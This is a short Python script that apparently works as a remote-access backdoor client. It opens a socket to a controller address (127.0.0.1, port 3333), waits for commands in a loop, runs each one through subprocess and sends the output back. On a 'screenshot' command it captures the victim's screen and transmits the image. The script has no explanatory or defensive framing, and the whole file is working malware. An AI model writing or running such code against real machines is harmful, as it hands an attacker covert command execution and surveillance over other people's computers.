import os
import socket
import random
import pyautogui
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ('127.0.0.1', 3333)
sock.connect(addr)
CRTD = "<CRTD>"
FILE = "<FILE>"

def screenshot():
    scrn = pyautogui.screenshot()
    name = f"{random.randint(1,1000)}.jpeg"
    scrn.save(name)
    with open(name, "rb") as file:
        data = file.read()
        file.close()

    sock.send(FILE.encode())
    sock.send(name.encode())
    sock.send(data)

def command(x):
    cmd = x.split()
    if cmd[0] == "cd":
        os.chdir(cmd[1])
        sock.send(CRTD.encode())
    else:
        output = subprocess.getoutput(cmd)
        if output == "":
            sock.send(CRTD.encode())
        else:
            sock.send(output.encode())

while True:
    response = sock.recv(1024).decode()
    print(f"Received: {response}")

    match response:
        case "screenshot":
            screenshot()
        case _:
            command(response)
